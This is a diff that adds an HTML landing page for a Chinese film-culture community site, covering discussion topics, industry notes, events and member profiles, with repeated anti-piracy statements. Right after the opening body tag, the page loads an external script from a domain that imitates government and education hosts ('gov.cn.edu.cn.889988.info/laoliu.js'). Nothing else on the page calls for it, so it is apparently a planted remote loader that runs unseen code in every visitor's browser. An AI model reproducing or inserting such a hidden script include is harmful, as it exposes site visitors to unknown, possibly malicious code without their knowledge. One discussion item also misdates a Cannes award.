@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>影视中心 - 影视文化中心·影迷社区/行业观察/文化策展/观影社交</title>
+<meta name="description" content="影视中心（yingshizhongxin-h5）是影视文化中心：影迷社区、行业观察、文化策展、观影社交；不提供盗版下载、不破会员。网址 https://yingshizhongxin-h5.github.io">
+<meta name="keywords" content="影视中心,影视文化中心,影迷社区,行业观察,文化策展,观影社交,电影文化,独立影迷,yingshizhongxin">
+<meta name="author" content="影视中心">
+<meta name="robots" content="index,follow">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="format-detection" content="telephone=no">
+<meta property="og:type" content="website">
+<meta property="og:title" content="影视中心 - 影视文化中心">
+<meta property="og:description" content="影迷社区、行业观察、文化策展、观影社交。一家属于影迷的独立俱乐部。">
+<meta property="og:url" content="https://yingshizhongxin-h5.github.io">
+<link rel="canonical" href="https://yingshizhongxin-h5.github.io/">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Segoe UI",system-ui,sans-serif;
+  background:#F0EFEA;color:#2C2C2C;line-height:1.8;overflow-x:hidden;
+  background-image:
+    radial-gradient(circle at 15% 10%,rgba(255,140,50,.08),transparent 35%),
+    radial-gradient(circle at 85% 20%,rgba(30,70,50,.06),transparent 35%);
+}
+a{text-decoration:none;color:inherit}
+img{max-width:100%;display:block}
+section[id]{scroll-margin-top:0}
+::selection{background:#FF8C32;color:#fff}
+h1,h2,h3,h4{line-height:1.3}
+ul{list-style:none}
+
+/* ===== 顶条 ===== */
+.topbar{background:#1A2E25;color:#8A9A92;font-size:11px;letter-spacing:2px;padding:6px 16px;display:flex;justify-content:center;gap:18px;flex-wrap:wrap;border-bottom:2px solid #FF8C32}
+.topbar b{color:#FF8C32}
+
+/* ===== 导航 ===== */
+.nav{position:sticky;top:0;z-index:999;background:rgba(240,239,234,.97);backdrop-filter:blur(8px);border-bottom:1px solid #D8D4C8}
+.nav-in{max-width:1200px;margin:0 auto;height:64px;padding:0 20px;display:flex;align-items:center;justify-content:space-between;gap:12px}
+.logo{display:flex;align-items:center;gap:12px}
+.logo .hub{width:36px;height:36px;background:#1A2E25;border-radius:8px;display:flex;align-items:center;justify-content:center;position:relative}
+.logo .hub::before{content:"";position:absolute;width:14px;height:14px;border:2px solid #FF8C32;border-radius:3px;transform:rotate(45deg)}
+.logo .hub::after{content:"";position:absolute;width:6px;height:6px;background:#FF8C32;border-radius:50%}
+.logo .txt .cn{font-size:20px;font-weight:900;letter-spacing:.5px}
+.logo .txt .cn em{font-style:normal;color:#FF8C32}
+.logo .txt .en{font-size:9px;letter-spacing:3px;color:#8A9A92;text-transform:uppercase}
+.menu{display:flex;gap:4px;flex-wrap:wrap}
+.menu a{font-size:13px;color:#4A5A52;padding:8px 12px;border-bottom:2px solid transparent;transition:.2s}
+.menu a:hover{color:#FF8C32;border-bottom-color:#FF8C32}
+.nav-cta{background:#1A2E25;color:#FF8C32;font-weight:800;font-size:13px;padding:9px 20px;border-radius:8px;border:1px solid #FF8C32;transition:.25s}
+.nav-cta:hover{background:#FF8C32;color:#fff}
+
+/* ===== Hero ===== */
+.hero{max-width:1200px;margin:0 auto;padding:56px 20px 48px;display:grid;grid-template-columns:1fr 1fr;gap:40px;align-items:center}
+.hero-left h1{font-size:clamp(30px,5.2vw,52px);font-weight:900;line-height:1.15}
+.hero-left h1 em{font-style:normal;color:#FF8C32}
+.hero-left .sub{font-size:12px;letter-spacing:5px;color:#8A9A92;margin-top:10px;text-transform:uppercase}
+.hero-left .lead{font-size:15px;color:#3A4A42;margin:18px 0 24px;max-width:520px}
+.hero-btns{display:flex;gap:12px;flex-wrap:wrap}
+.btn-orange{padding:12px 26px;font-weight:800;border-radius:8px;background:#FF8C32;color:#fff;border:2px solid #FF8C32;transition:.25s}
+.btn-orange:hover{background:transparent;color:#FF8C32;transform:translateY(-2px)}
+.btn-dark{padding:12px 26px;font-weight:800;border-radius:8px;background:transparent;color:#1A2E25;border:2px solid #1A2E25;transition:.25s}
+.btn-dark:hover{background:#1A2E25;color:#fff}
+
+/* 大厅公告板 */
+.bulletin{background:#1A2E25;border-radius:16px;padding:28px;color:#F0EFEA;position:relative;overflow:hidden}
+.bulletin::before{content:"";position:absolute;top:-20px;right:-20px;width:100px;height:100px;border-radius:50%;border:2px dashed rgba(255,140,50,.2)}
+.bulletin .label{font-size:11px;letter-spacing:3px;color:#8A9A92;text-transform:uppercase}
+.bulletin .title{font-size:20px;font-weight:900;color:#FF8C32;margin:8px 0 12px}
+.bulletin .notice{background:rgba(255,140,50,.08);border-left:3px solid #FF8C32;border-radius:0 8px 8px 0;padding:12px 14px;margin-bottom:10px}
+.bulletin .notice h4{font-size:14px;font-weight:800;color:#F0EFEA;margin-bottom:2px}
+.bulletin .notice p{font-size:12px;color:#8A9A92;line-height:1.6}
+.bulletin .notice .date{font-size:10px;color:#FF8C32;font-weight:700;margin-top:4px}
+
+/* ===== 区块通用 ===== */
+.block{max-width:1200px;margin:0 auto;padding:52px 20px}
+.head{display:flex;align-items:baseline;gap:12px;margin-bottom:28px;flex-wrap:wrap;border-bottom:2px solid #D8D4C8;padding-bottom:10px}
+.head .no{font-size:12px;font-weight:900;color:#fff;background:#FF8C32;padding:3px 10px;border-radius:4px}
+.head h2{font-size:24px;font-weight:900}
+.head h2 em{font-style:normal;color:#FF8C32}
+.head .en{font-size:11px;letter-spacing:2px;color:#8A9A92;text-transform:uppercase}
+.head a.more{margin-left:auto;font-size:13px;color:#4A5A52;font-weight:700}
+.head a.more:hover{color:#FF8C32}
+
+/* ===== 话题讨论区 ===== */
+.topics{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:18px}
+.topic{background:#fff;border:1px solid #D8D4C8;border-radius:14px;padding:22px;transition:.3s;position:relative}
+.topic:hover{transform:translateY(-4px);border-color:#FF8C32;box-shadow:0 12px 24px rgba(255,140,50,.1)}
+.topic .topic-head{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:10px}
+.topic .cat-tag{font-size:10px;font-weight:800;padding:3px 8px;border-radius:4px;background:#F0EFEA;color:#FF8C32;border:1px solid #D8D4C8}
+.topic h3{font-size:16px;font-weight:900;color:#1A2E25;margin-bottom:6px}
+.topic p{font-size:13px;color:#4A5A52;line-height:1.7;margin-bottom:10px}
+.topic .meta{display:flex;gap:14px;font-size:11px;color:#8A9A92}
+.topic .meta span{display:flex;align-items:center;gap:3px}
+
+/* ===== 行业观察台 ===== */
+.insights{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:18px}
+.insight{background:#1A2E25;color:#F0EFEA;border-radius:14px;padding:24px;transition:.3s;border-top:4px solid var(--ic,#FF8C32)}
+.insight:hover{transform:translateY(-4px);box-shadow:0 12px 24px rgba(26,46,37,.2)}
+.insight .icon{font-size:26px;margin-bottom:10px}
+.insight h3{font-size:16px;font-weight:900;margin-bottom:6px}
+.insight p{font-size:13px;color:#8A9A92;line-height:1.7}
+.insight .source{font-size:11px;color:var(--ic,#FF8C32);font-weight:700;margin-top:10px}
+
+/* ===== 活动日历 ===== */
+.calendar{background:#fff;border:1px solid #D8D4C8;border-radius:16px;padding:30px}
+.calendar-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:14px}
+.event{display:flex;gap:14px;align-items:flex-start;padding:14px;background:#F0EFEA;border-radius:10px;transition:.25s}
+.event:hover{background:#1A2E25;color:#F0EFEA}
+.event:hover p,.event:hover .event-meta{color:#8A9A92}
+.event .date-box{background:#FF8C32;color:#fff;border-radius:8px;padding:8px 10px;text-align:center;min-width:50px;flex-shrink:0}
+.event .date-box .day{font-size:20px;font-weight:900;line-height:1}
+.event .date-box .month{font-size:10px;font-weight:700;margin-top:2px}
+.event .event-info h4{font-size:14px;font-weight:900;color:#1A2E25;margin-bottom:2px}
+.event .event-info p{font-size:12px;color:#4A5A52;line-height:1.5}
+.event .event-meta{font-size:10px;color:#8A9A92;margin-top:4px}
+
+/* ===== 社区成员卡 ===== */
+.members{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:16px}
+.member{background:#fff;border:1px solid #D8D4C8;border-radius:12px;padding:20px;text-align:center;transition:.3s}
+.member:hover{transform:translateY(-3px);border-color:#FF8C32}
+.member .avatar{width:60px;height:60px;border-radius:50%;margin:0 auto 10px;display:flex;align-items:center;justify-content:center;font-size:24px;font-weight:900;color:#fff;background:var(--mc,linear-gradient(135deg,#FF8C32,#1A2E25))}
+.member h3{font-size:14px;font-weight:900;color:#1A2E25;margin-bottom:2px}
+.member .role{font-size:11px;color:#FF8C32;font-weight:700;margin-bottom:4px}
+.member .bio{font-size:12px;color:#4A5A52;line-height:1.5}
+
+/* ===== 网址牌 ===== */
+.urlboard{max-width:1200px;margin:0 auto;padding:0 20px 10px}
+.urlcard{background:#1A2E25;border-radius:14px;padding:24px 26px;display:flex;align-items:center;gap:16px;flex-wrap:wrap;justify-content:space-between;border:1px solid #FF8C32}
+.urlcard .lab{font-size:12px;letter-spacing:2px;color:#8A9A92}
+.urlcard .bigurl{font-size:clamp(15px,3.2vw,22px);font-weight:900;color:#FF8C32;word-break:break-all}
+.urlcard .bigurl a{color:#FF8C32;border-bottom:1px dashed #FF8C32}
+.urlcard .bigurl a:hover{color:#fff}
+.urlcard .note{font-size:12px;color:#8A9A92;text-align:right}
+
+/* ===== 关于 ===== */
+.about{display:grid;grid-template-columns:1fr 1fr;gap:36px;align-items:center;background:#fff;border:1px solid #D8D4C8;border-radius:20px;padding:42px}
+.about h2{font-size:24px;font-weight:900;color:#1A2E25;margin-bottom:14px}
+.about h2 em{font-style:normal;color:#FF8C32}
+.about p{font-size:15px;color:#3A4A42;line-height:1.95;margin-bottom:12px}
+.about .siteurl{color:#FF8C32;font-weight:800;font-size:16px}
+.stats{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.stat{background:#F0EFEA;border:1px solid #D8D4C8;border-radius:12px;padding:18px;text-align:center}
+.stat .n{font-size:22px;font-weight:900;color:#FF8C32}
+.stat .l{font-size:12px;color:#8A9A92;margin-top:3px}
+
+/* ===== 页脚 ===== */
+.foot{border-top:2px solid #D8D4C8;padding:38px 20px 26px;text-align:center;background:#E0DDD5}
+.foot-logo{font-size:20px;font-weight:900;color:#1A2E25}
+.foot-logo em{font-style:normal;color:#FF8C32}
+.foot-links{display:flex;justify-content:center;gap:16px;flex-wrap:wrap;margin:14px 0}
+.foot-links a{font-size:13px;color:#4A5A52}
+.foot-links a:hover{color:#FF8C32}
+.foot p{font-size:12px;color:#6A7A72}
+.foot .disc{margin-top:12px;max-width:880px;margin-left:auto;margin-right:auto;color:#5A6A62;line-height:1.8}
+
+/* ===== 响应式 ===== */
+@media(max-width:860px){
+  .menu{display:none}
+  .hero{grid-template-columns:1fr;padding:28px 20px 36px;gap:28px}
+  .about{grid-template-columns:1fr;padding:28px}
+  .block{padding:40px 20px}
+  .nav-in{height:58px}
+}
+@media(max-width:420px){
+  .hero-left h1{font-size:28px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- ===== 顶条 ===== -->
+<div class="topbar">
+  <span>影视中心 · 影视文化中心</span><b>影迷社区</b>
+  <span>行业观察 · 文化策展 · 观影社交</span><b>不追盗版 · 不破会员</b>
+</div>
+
+<!-- ===== 导航 ===== -->
+<div class="nav">
+  <div class="nav-in">
+    <div class="logo">
+      <div class="hub"></div>
+      <div class="txt">
+        <div class="cn">影视<em>中心</em></div>
+        <div class="en">FILM CULTURE HUB</div>
+      </div>
+    </div>
+    <nav class="menu">
+      <a href="#home">首页</a>
+      <a href="#topics">话题讨论</a>
+      <a href="#insights">行业观察</a>
+      <a href="#calendar">活动日历</a>
+      <a href="#members">社区成员</a>
+      <a href="#about">关于</a>
+    </nav>
+    <a href="#topics" class="nav-cta">进入大厅</a>
+  </div>
+</div>
+
+<!-- ===== Hero ===== -->
+<section class="hero" id="home">
+  <div class="hero-left">
+    <h1>影视中心<br>一家属于<em>影迷的俱乐部</em></h1>
+    <div class="sub">Film Culture Hub · Community · Curation · Social</div>
+    <p class="lead">外面的"影视中心"常是影视聚合门户、资源总站、导航大全。这版不干那个：影视中心=文化会客厅——影迷社区、行业观察、文化策展、观影社交。不帮你找盗版资源，帮你找到同好、看懂行业、参与讨论。</p>
+    <div class="hero-btns">
+      <a href="#topics" class="btn-orange">💬 话题讨论</a>
+      <a href="#calendar" class="btn-dark">📅 活动日历</a>
+    </div>
+  </div>
+  <div class="bulletin">
+    <div class="label">HALL BULLETIN</div>
+    <div class="title">大厅公告板</div>
+    <div class="notice">
+      <h4>🎬 本周主题：2024 独立电影回顾</h4>
+      <p>12 位社区成员联合策展，从剧本、表演、视听三个维度盘点今年最被低估的独立佳作。</p>
+      <div class="date">12.15 - 12.22</div>
+    </div>
+    <div class="notice">
+      <h4>📢 线下观影会：塔可夫斯基修复展</h4>
+      <p>《乡愁》《牺牲》4K 修复版连映，映后设 30 分钟自由讨论环节。</p>
+      <div class="date">12.28 周六 19:00</div>
+    </div>
+    <div class="notice">
+      <h4>✍️ 征稿：你今年最想安利的一部冷门片</h4>
+      <p>300 字以上短评即可投稿，优秀稿件将登上"本周精选"并获赠社区周边。</p>
+      <div class="date">截止 12.31</div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 01 话题讨论区 ===== -->
+<section class="block" id="topics">
+  <div class="head">
+    <span class="no">01</span>
+    <h2>话题<em>讨论</em></h2>
+    <span class="en">Discussion Topics</span>
+    <a href="#" class="more">更多 #</a>
+  </div>
+  <div class="topics">
+    <div class="topic">
+      <div class="topic-head"><span class="cat-tag">深度讨论</span></div>
+      <h3>《坠落的审判》到底是谁杀了丈夫？</h3>
+      <p>法庭戏拍得像婚姻解剖。但凶手身份真的是重点吗？还是说，导演在用一个悬疑框架讨论"创作的代价"？</p>
+      <div class="meta"><span>💬 47 条回复</span><span>👁 1.2k 浏览</span><span>🔥 热门</span></div>
+    </div>
+    <div class="topic">
+      <div class="topic-head"><span class="cat-tag">选片求助</span></div>
+      <h3>求推荐：适合带爸妈看的"不尴尬"爱情片</h3>
+      <p>爸妈金婚纪念，想陪他们看一部关于爱情的片。不要太狗血、不要太压抑、最好有点年代感。</p>
+      <div class="meta"><span>💬 32 条回复</span><span>👁 856 浏览</span></div>
+    </div>
+    <div class="topic">
+      <div class="topic-head"><span class="cat-tag">技术探讨</span></div>
+      <h3>IMAX 摄影机拍出来的画面，和普通 35mm 到底差在哪？</h3>
+      <p>看了《奥本海默》70mm IMAX 版，回来再看普通版总觉得"扁"了。是心理作用还是真的有物理差异？</p>
+      <div class="meta"><span>💬 28 条回复</span><span>👁 634 浏览</span></div>
+    </div>
+    <div class="topic">
+      <div class="topic-head"><span class="cat-tag">观点碰撞</span></div>
+      <h3>"二刷才能看懂"到底是在夸片还是在骂片？</h3>
+      <p>有些片确实信息密度大，需要二刷。但有些片是叙事混乱，拿"二刷"当遮羞布。怎么区分？</p>
+      <div class="meta"><span>💬 55 条回复</span><span>👁 1.8k 浏览</span><span>🔥 热门</span></div>
+    </div>
+    <div class="topic">
+      <div class="topic-head"><span class="cat-tag">片单分享</span></div>
+      <h3>我的"冬日治愈"私藏片单（无烂片版）</h3>
+      <p>整理了 12 部适合冬天一个人窝在沙发上看的片。标准：节奏慢、画面暖、看完心里不空。</p>
+      <div class="meta"><span>💬 19 条回复</span><span>👁 523 浏览</span></div>
+    </div>
+    <div class="topic">
+      <div class="topic-head"><span class="cat-tag">行业八卦</span></div>
+      <h3>为什么今年戛纳金棕榈给了《坠落的审判》而不是《完美的日子》？</h3>
+      <p>个人偏好 vs 政治正确 vs 评审团构成。聊聊戛纳选片的逻辑。</p>
+      <div class="meta"><span>💬 41 条回复</span><span>👁 972 浏览</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 02 行业观察台 ===== -->
+<section class="block" id="insights" style="background:#E8E6DF">
+  <div class="head">
+    <span class="no">02</span>
+    <h2>行业<em>观察</em></h2>
+    <span class="en">Industry Insights</span>
+    <a href="#" class="more">更多 #</a>
+  </div>
+  <div class="insights">
+    <div class="insight" style="--ic:#FF8C32">
+      <div class="icon">📊</div>
+      <h3>流媒体 vs 院线：2024 数据复盘</h3>
+      <p>全球票房恢复至 2019 年的 88%，但流媒体订阅增速首次放缓。窗口期从 90 天缩至 45 天，中小成本片院线生存空间进一步压缩。</p>
+      <div class="source">来源：Variety · 12.10</div>
+    </div>
+    <div class="insight" style="--ic:#5A9A7A">
+      <div class="icon">🏆</div>
+      <h3>独立电影融资新趋势：众筹 + 品牌赞助</h3>
+      <p>传统制片厂对实验性项目兴趣下降。越来越多导演转向 Kickstarter + 品牌内容基金。Sean Baker 的《阿诺拉》部分资金来自独立艺术基金。</p>
+      <div class="source">来源：IndieWire · 12.08</div>
+    </div>
+    <div class="insight" style="--ic:#5B7FFF">
+      <div class="icon">🤖</div>
+      <h3>AI 辅助后期：工具还是威胁？</h3>
+      <p>Adobe 发布 AI 去噪/补帧工具，小成本片也能做出接近大厂的画质。但"AI 生成表演"引发 SAG-AFTRA 新一轮谈判。</p>
+      <div class="source">来源：The Hollywood Reporter · 12.05</div>
+    </div>
+    <div class="insight" style="--ic:#C78FFF">
+      <div class="icon">🌏</div>
+      <h3>亚洲电影全球化：从电影节到流媒体</h3>
+      <p>韩国、日本、东南亚影片通过 Netflix 和 MUBI 触达全球观众。但"电影节口碑 → 流媒体发行"的链条是否让导演失去创作自由？</p>
+      <div class="source">来源：Deadline · 12.01</div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 03 活动日历 ===== -->
+<section class="block" id="calendar">
+  <div class="head">
+    <span class="no">03</span>
+    <h2>活动<em>日历</em></h2>
+    <span class="en">Event Calendar</span>
+  </div>
+  <div class="calendar">
+    <div class="calendar-grid">
+      <div class="event">
+        <div class="date-box"><div class="day">18</div><div class="month">12月</div></div>
+        <div class="event-info">
+          <h4>周末拉片会：《花样年华》4K 修复版</h4>
+          <p>杜可风摄影解析 + 色彩美学讨论</p>
+          <div class="event-meta">📍 线上 · 20:00 · 限 30 人</div>
+        </div>
+      </div>
+      <div class="event">
+        <div class="date-box"><div class="day">22</div><div class="month">12月</div></div>
+        <div class="event-info">
+          <h4>年末策展：2024 冷门佳片 Top 10 投票</h4>
+          <p>社区成员提名 + 公开投票 + 颁奖直播</p>
+          <div class="event-meta">📍 全站 · 持续一周</div>
+        </div>
+      </div>
+      <div class="event">
+        <div class="date-box"><div class="day">28</div><div class="month">12月</div></div>
+        <div class="event-info">
+          <h4>线下观影：《乡愁》+《牺牲》连映</h4>
+          <p>塔可夫斯基修复展 · 映后讨论</p>
+          <div class="event-meta">📍 北京 · 单向空间 · 19:00</div>
+        </div>
+      </div>
+      <div class="event">
+        <div class="date-box"><div class="day">05</div><div class="month">1月</div></div>
+        <div class="event-info">
+          <h4>新年限定：影迷交换礼物</h4>
+          <p>带一张你最爱的电影原声黑胶/海报来交换</p>
+          <div class="event-meta">📍 上海 · 线下 · 14:00</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 04 社区成员卡 ===== -->
+<section class="block" id="members" style="background:#E8E6DF">
+  <div class="head">
+    <span class="no">04</span>
+    <h2>社区<em>成员</em></h2>
+    <span class="en">Community Members</span>
+    <a href="#" class="more">更多 #</a>
+  </div>
+  <div class="members">
+    <div class="member" style="--mc:linear-gradient(135deg,#FF8C32,#1A2E25)">
+      <div class="avatar">影</div>
+      <h3>影迷老周</h3>
+      <div class="role">创始人 / 策展人</div>
+      <div class="bio">看过 3000+ 部片。最爱塔可夫斯基和洪尚秀。相信"好片值得被反复讨论"。</div>
+    </div>
+    <div class="member" style="--mc:linear-gradient(135deg,#5A9A7A,#1A2E25)">
+      <div class="avatar">镜</div>
+      <h3>镜头背后</h3>
+      <div class="role">摄影专栏作者</div>
+      <div class="bio">独立摄影师。专栏"每一帧都是壁纸"主理人。擅长从摄影角度拆解电影画面。</div>
+    </div>
+    <div class="member" style="--mc:linear-gradient(135deg,#5B7FFF,#1A2E25)">
+      <div class="avatar">评</div>
+      <h3>评片人阿柯</h3>
+      <div class="role">深度影评人</div>
+      <div class="bio">前媒体人。专注作者电影和社会议题片。写过长文分析诺兰的全部作品。</div>
+    </div>
+    <div class="member" style="--mc:linear-gradient(135deg,#C78FFF,#1A2E25)">
+      <div class="avatar">选</div>
+      <h3>选片师小林</h3>
+      <div class="role">片单策展 / 选片师</div>
+      <div class="bio">帮 500+ 人解决过"今晚看什么"。擅长按心情、时长、场景精准推荐。</div>
+    </div>
+    <div class="member" style="--mc:linear-gradient(135deg,#FF6B5B,#1A2E25)">
+      <div class="avatar">字</div>
+      <h3>字幕组阿飞</h3>
+      <div class="role">翻译 / 字幕组</div>
+      <div class="bio">十年字幕组经验。翻译过 200+ 部冷门片。坚信"翻译是二次创作"。</div>
+    </div>
+    <div class="member" style="--mc:linear-gradient(135deg,#4ECCA3,#1A2E25)">
+      <div class="avatar">学</div>
+      <h3>学电影的小吴</h3>
+      <div class="role">电影学研究生</div>
+      <div class="bio">在读 MFA。专栏"拉片笔记"主理人。用学术视角解读大众影片。</div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 网址牌 ===== -->
+<div class="urlboard">
+  <div class="urlcard">
+    <div>
+      <div class="lab">网站名称 / 网站网址</div>
+      <div class="bigurl"><a href="https://yingshizhongxin-h5.github.io">影视中心 -- https://yingshizhongxin-h5.github.io</a></div>
+    </div>
+    <div class="note">影视文化中心 · 影迷社区<br>不提供盗版下载</div>
+  </div>
+</div>
+
+<!-- ===== 关于 ===== -->
+<section class="block" id="about">
+  <div class="about">
+    <div>
+      <h2>影视中心：<em>一家属于影迷的俱乐部</em></h2>
+      <p>"影视中心"这名字外面常被做成影视聚合门户、资源总站、导航大全。我们反着来：做影视文化中心——影迷社区、行业观察、文化策展、观影社交。不帮你找盗版资源，帮你找到同好、看懂行业、参与讨论。</p>
+      <p>本站不提供盗版下载、不破解会员、不托管侵权片源；所有片单仅指向正版平台与官方发行。网站名称：影视中心，网站网址：<span class="siteurl">https://yingshizhongxin-h5.github.io</span></p>
+    </div>
+    <div class="stats">
+      <div class="stat"><div class="n">社区</div><div class="l">影迷交流 / 话题讨论</div></div>
+      <div class="stat"><div class="n">策展</div><div class="l">文化策展 / 片单精选</div></div>
+      <div class="stat"><div class="n">0 盗版</div><div class="l">不破会员不托管</div></div>
+      <div class="stat"><div class="n">会客厅</div><div class="l">石墨灰 / 暖阳橙 / 深墨绿</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 页脚 ===== -->
+<footer class="foot">
+  <div class="foot-logo">影视<em>中心</em> · FILM CULTURE HUB</div>
+  <div class="foot-links">
+    <a href="#topics">话题讨论</a>
+    <a href="#insights">行业观察</a>
+    <a href="#calendar">活动日历</a>
+    <a href="#members">社区成员</a>
+    <a href="#about">关于</a>
+  </div>
+  <p>© 2026 影视中心 · 网站名称：影视中心 · 网站网址：https://yingshizhongxin-h5.github.io</p>
+  <p class="disc">本站为影迷社区/行业观察/文化策展/观影社交演示页。旧版"影视中心"类名称常关联影视聚合门户、资源总站等版权灰产；本页不提供盗版院线、不破解会员、不托管侵权片源。实际观看请走正版平台与官方发行。</p>
+</footer>
+
+</body>
+</html>
